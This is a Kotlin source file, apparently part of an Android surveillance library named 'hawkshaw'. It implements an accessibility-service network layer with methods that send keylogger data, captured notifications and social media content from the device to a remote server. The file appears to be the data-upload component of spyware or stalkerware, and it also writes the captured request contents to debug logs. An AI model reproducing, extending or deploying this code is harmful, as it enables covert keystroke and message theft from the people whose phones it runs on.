package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import android.util.Log

/**
 * Implementation of the AccessibilityService interface
 */
class AccessibilityServiceImpl : AccessibilityService {
    private companion object {
        private const val TAG = "AccessibilityService"
    }

    init {
        Log.d(TAG, "[DEBUG] AccessibilityServiceImpl instance created.")
    }

    /**
     * Push keylogger data to the server
     */
    override suspend fun pushKeyLogs(request: PushKeyLogsRequest): ApiResponse<PushKeyLogsResponse> {
        Log.d(TAG, "[DEBUG] pushKeyLogs called. Request: $request")
        val path = "accessibility.Accessibility/PushKeyLogs"
        Log.d(TAG, "[DEBUG] pushKeyLogs: Calling apiCall with path: \"$path\" and request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushKeyLogsRequest, PushKeyLogsResponse>(path, request)
        Log.d(TAG, "[DEBUG] pushKeyLogs: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push notification data to the server
     */
    override suspend fun pushNotifications(request: PushNotificationRequest): ApiResponse<PushNotificationResponse> {
        Log.d(TAG, "[DEBUG] pushNotifications called. Request: $request")
        val path = "accessibility.Accessibility/PushNotifications"
        Log.d(TAG, "[DEBUG] pushNotifications: Calling apiCall with path: \"$path\" and request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushNotificationRequest, PushNotificationResponse>(path, request)
        Log.d(TAG, "[DEBUG] pushNotifications: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push social media data to the server
     */
    override suspend fun pushSocialMedia(request: PushSocialMediaRequest): ApiResponse<PushSocialMediaResponse> {
        Log.d(TAG, "[DEBUG] pushSocialMedia called. Request: $request")
        val path = "accessibility.Accessibility/PushSocialMedia"
        Log.d(TAG, "[DEBUG] pushSocialMedia: Calling apiCall with path: \"$path\" and request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushSocialMediaRequest, PushSocialMediaResponse>(path, request)
        Log.d(TAG, "[DEBUG] pushSocialMedia: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push unprocessed social media data to the server
     */
    override suspend fun pushUnprocessedSocialMedia(request: PushUnprocessedSocialMediaRequest): ApiResponse<PushUnprocessedSocialMediaResponse> {
        Log.d(TAG, "[DEBUG] pushUnprocessedSocialMedia called. Request: $request")
        val path = "accessibility.Accessibility/PushUnprocessedSocialMedia"
        Log.d(TAG, "[DEBUG] pushUnprocessedSocialMedia: Calling apiCall with path: \"$path\" and request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushUnprocessedSocialMediaRequest, PushUnprocessedSocialMediaResponse>(path, request)
        Log.d(TAG, "[DEBUG] pushUnprocessedSocialMedia: apiCall returned. Response: $response")
        return response
    }
}

